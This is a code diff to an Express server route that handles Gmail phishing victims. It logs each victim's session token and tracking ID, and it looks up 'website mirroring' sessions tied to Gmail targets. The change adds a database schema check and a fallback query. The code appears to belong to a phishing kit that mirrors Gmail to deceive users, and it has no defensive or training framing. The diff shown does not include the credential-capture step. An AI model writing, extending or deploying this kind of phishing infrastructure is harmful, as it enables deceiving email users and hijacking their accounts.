@@ -92,12 +92,30 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
   try {
     console.log(`🎯 Gmail phishing victim accessed: ${sessionToken} (tracking: ${trackingId})`);
     
-    // First, look up the session token to find the associated campaign
-    const query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND session_type = 'gmail_browser'`;
+    // Check if session_type column exists and build appropriate query
     const sessionRecord = await new Promise((resolve, reject) => {
-      db.get(query, [sessionToken], (err, row) => {
-        if (err) reject(err);
-        else resolve(row);
+      db.all("PRAGMA table_info(WebsiteMirroringSessions)", (err, columns) => {
+        if (err) {
+          reject(err);
+          return;
+        }
+
+        const hasSessionType = columns.some(col => col.name === 'session_type');
+        
+        let query, params;
+        if (hasSessionType) {
+          query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND session_type = 'gmail_browser'`;
+          params = [sessionToken];
+        } else {
+          // Fallback: look for any session with this token (assuming Gmail URLs contain 'gmail')
+          query = `SELECT * FROM WebsiteMirroringSessions WHERE session_token = ? AND target_url LIKE '%gmail%'`;
+          params = [sessionToken];
+        }
+
+        db.get(query, params, (err, row) => {
+          if (err) reject(err);
+          else resolve(row);
+        });
       });
     });
 
